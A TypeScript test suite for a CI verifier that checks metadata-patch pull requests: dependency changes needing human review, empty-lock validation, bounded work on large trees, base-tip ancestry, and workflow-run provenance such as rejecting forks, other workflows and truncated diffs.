      w.base.set(
        "f/factory/foo.ts",
        'import { x } from "../factory/lib/bar.ts";\n',
      );
      w.head.set("f/factory/lib/bar.ts", 'import pad from "left-pad@2.0.0";\n');
      expect(await codeOf(w)).toBe("dependency_change_requires_human");
    });
  });

  describe("verifyMetadataPatch requires no dependency of a new script", () => {
    test("rejects a new script even when the base tip holds the same content", async () => {
      const w = withNewScript('import pad from "left-pad@1.3.0";\n');
      w.base.set("f/factory/newone.ts", 'import pad from "left-pad@1.3.0";\n');
      expect(await codeOf(w)).toBe("dependency_change_requires_human");
    });

    test("accepts a new script without a dependency when the base tip holds the same", async () => {
      const w = withNewScript("export function main() {}\n");
      w.base.set("f/factory/newone.ts", "export function main() {}\n");
      expect(await codeOf(w)).toBe("ok");
    });
  });

  describe("verifyMetadataPatch checks the reference empty lock", () => {
    test.each([
      ["a lock with a dependency", LOCK],
      ["a lock without the marker", '{"dependencies": {}}'],
      [
        "a lock with another key",
        '{"dependencies": {}, "scripts": {}}\n//bun.lock\n<empty>',
      ],
      [
        "a lock with a second half",
        '{"dependencies": {}}\n//bun.lock\n{"a": 1}',
      ],
      ["a lock with a list", "[]\n//bun.lock\n<empty>"],
      ["text that is not JSON", "x\n//bun.lock\n<empty>"],
      [
        "a lock with two markers",
        '{"dependencies": {}}\n//bun.lock\n//bun.lock\n<empty>',
      ],
    ])("rejects %s as the reference", async (_label, content) => {
      const w = withNewScript("export function main() {}\n");
      w.base.set(EMPTY_LOCK_PATH, content);
      w.patch.set("f/factory/newone.script.lock", content);
      expect(await codeOf(w)).toBe("empty_lock_invalid");
    });

    test("accepts a reference with spaces in the first half", async () => {
      const w = withNewScript("export function main() {}\n");
      const content = '{ "dependencies" : { } }\n//bun.lock\n<empty>';
      w.base.set(EMPTY_LOCK_PATH, content);
      w.patch.set("f/factory/newone.script.lock", content);
      expect(await codeOf(w)).toBe("ok");
    });
  });

  describe("verifyMetadataPatch accepts the hash file in the diff", () => {
    test("accepts a PR that already updated the hash file", async () => {
      const w = world();
      w.pr = {
        ...w.pr,
        diff: [...w.pr.diff, { path: "wmill-lock.yaml", status: "modified" }],
      };
      expect(await codeOf(w)).toBe("ok");
    });

    test("rejects a path below the hash file name", async () => {
      const w = world();
      w.pr = {
        ...w.pr,
        diff: [...w.pr.diff, { path: "wmill-lock.yaml/x", status: "modified" }],
      };
      expect(await codeOf(w)).toBe("pr_diff_not_allowed");
    });

    test("rejects a hash file in another folder", async () => {
      const w = world();
      w.pr = {
        ...w.pr,
        diff: [
          ...w.pr.diff,
          { path: "sub/wmill-lock.yaml", status: "modified" },
        ],
      };
      expect(await codeOf(w)).toBe("pr_diff_not_allowed");
    });
  });

  describe("verifyMetadataPatch keeps the work bounded", () => {
    test("rejects a tree with too many sources", async () => {
      const w = world();
      for (let i = 0; i < MAX_SOURCES + 1; i++) {
        w.head.set(`f/gen/s${String(i)}.ts`, "export const a = 1;\n");
      }
      expect(await codeOf(w)).toBe("too_many_sources");
    });

    test("reads and scans each file once for many scripts", async () => {
      const w = world();
      const body = 'import { c } from "./common.ts";\n'.repeat(20);
      w.head.set("f/gen/common.ts", "export const c = 1;\n");
      w.base.set("f/gen/common.ts", "export const c = 0;\n");
      for (let i = 0; i < 300; i++) {
        const path = `f/gen/s${String(i)}.ts`;
        w.head.set(path, body);
        w.base.set(path, body);
      }
      w.pr = {
        ...w.pr,
        diff: [...w.pr.diff, { path: "f/gen/common.ts", status: "modified" }],
      };
      await verify(w);
      const counts = new Map<string, number>();
      for (const path of w.headReads) {
        counts.set(path, (counts.get(path) ?? 0) + 1);
      }
      expect(Math.max(...counts.values())).toBe(1);
    });

    test("reads each file of the base tip once for many scripts", async () => {
      const w = world();
      const body = 'import { c } from "./common.ts";\n';
      w.head.set("f/gen/common.ts", "export const c = 1;\n");
      w.base.set("f/gen/common.ts", "export const c = 0;\n");
      for (let i = 0; i < 100; i++) {
        const path = `f/gen/s${String(i)}.ts`;
        w.head.set(path, body);
        w.base.set(path, body);
      }
      w.pr = {
        ...w.pr,
        diff: [...w.pr.diff, { path: "f/gen/common.ts", status: "modified" }],
      };
      await verify(w);
      const counts = new Map<string, number>();
      for (const path of w.basePaths) {
        counts.set(path, (counts.get(path) ?? 0) + 1);
      }
      expect(Math.max(...counts.values())).toBe(1);
    });

    // 実時間が要る。上限に近い大きさのファイルが多数あっても、検証の作業量が有界であることを、経過時間の上限で確かめる。
    test("finishes on many files that are close to the size limit", async () => {
      const w = world();
      const body = 'import { c } from "./common.ts";\n'.repeat(
        Math.floor((MAX_FILE_BYTES - 1000) / 33),
      );
      w.head.set("f/gen/common.ts", "export const c = 1;\n");
      w.base.set("f/gen/common.ts", "export const c = 0;\n");
      for (let i = 0; i < 15; i++) {
        const path = `f/gen/big${String(i)}.ts`;
        w.head.set(path, body);
        w.base.set(path, body);
      }
      w.pr = {
        ...w.pr,
        diff: [...w.pr.diff, { path: "f/gen/common.ts", status: "modified" }],
      };
      const started = performance.now();
      await verify(w);
      expect(performance.now() - started).toBeLessThan(20000);
    });
  });

  describe("verifyMetadataPatch requires the head to hold the base tip", () => {
    test("rejects a head that lacks the tip of the base branch", async () => {
      const w = world();
      w.isAncestor = (ancestor, descendant) =>
        !(ancestor === BASE_TIP && descendant === HEAD);
      expect(await codeOf(w)).toBe("head_lacks_base");
    });

    test("asks whether the head holds the tip", async () => {
      const w = world();
      const asked: string[] = [];
      w.isAncestor = (ancestor, descendant) => {
        asked.push(`${ancestor}:${descendant}`);
        return true;
      };
      await verify(w);
      expect(asked).toEqual([`${BASE}:${BASE_TIP}`, `${BASE_TIP}:${HEAD}`]);
    });
  });
});

describe("metadata_patch_verify metadata patch provenance", () => {
  // 出どころの検査は、実行の事実とPRの差分だけを見る。
  // artifactとポートは渡さないので、ダウンロードと展開の前に呼べる。
  function check(change: (w: ReturnType<typeof world>) => void) {
    const w = world();
    change(w);
    const result = checkProvenance({ config: w.config, run: w.run, pr: w.pr });
    return result === null ? "ok" : result.code;
  }

  describe("checkProvenance", () => {
    test("passes a run of the same repository for the same head", () => {
      expect(check(() => {})).toBe("ok");
    });

    test("rejects a run of another workflow", () => {
      expect(
        check((w) => {
          w.run = { ...w.run, workflowPath: ".github/workflows/evil.yml" };
        }),
      ).toBe("workflow_path_mismatch");
    });

    test("rejects an event other than pull_request", () => {
      expect(
        check((w) => {
          w.run = { ...w.run, event: "push" };
        }),
      ).toBe("event_mismatch");
    });

    test("rejects a run of a fork", () => {
      expect(
        check((w) => {
          w.run = { ...w.run, headRepositoryFullName: "mallory/widgets" };
        }),
      ).toBe("head_repository_mismatch");
    });

    test("rejects a run without a head repository", () => {
      expect(
        check((w) => {
          w.run = { ...w.run, headRepositoryFullName: null };
        }),
      ).toBe("head_repository_mismatch");
    });

    test("rejects a run of another pull request", () => {
      expect(
        check((w) => {
          w.run = { ...w.run, pullRequestNumbers: [7] };
        }),
      ).toBe("pull_request_mismatch");
    });

    test("rejects a run of an older head", () => {
      expect(
        check((w) => {
          w.run = { ...w.run, headSha: "e".repeat(40) };
        }),
      ).toBe("run_head_sha_mismatch");
    });

    test("rejects a run that did not fail", () => {
      expect(
        check((w) => {
          w.run = { ...w.run, conclusion: "success" };
        }),
      ).toBe("run_not_failed");
    });

    test("rejects a run whose metadata job did not fail", () => {
      expect(
        check((w) => {
          w.run = { ...w.run, metadataJobConclusion: "success" };
        }),
      ).toBe("metadata_job_not_failed");
    });

    test("rejects a diff that is cut short", () => {
      expect(
        check((w) => {
          w.pr = { ...w.pr, diffTruncated: true };
        }),
      ).toBe("pr_diff_incomplete");
    });

    test("rejects a diff outside the allow list", () => {
      expect(
        check((w) => {
          w.pr = {
            ...w.pr,
            diff: [...w.pr.diff, { path: "scripts/a.ts", status: "modified" }],
          };
        }),
      ).toBe("pr_diff_not_allowed");
    });

    test("rejects a rename from outside the allow list", () => {
      expect(
        check((w) => {
          w.pr = {
            ...w.pr,
            diff: [
              {
                path: "f/factory/a.ts",
                previousPath: "scripts/a.ts",
                status: "renamed",
              },
            ],
          };
        }),
      ).toBe("pr_diff_not_allowed");
    });
  });
});
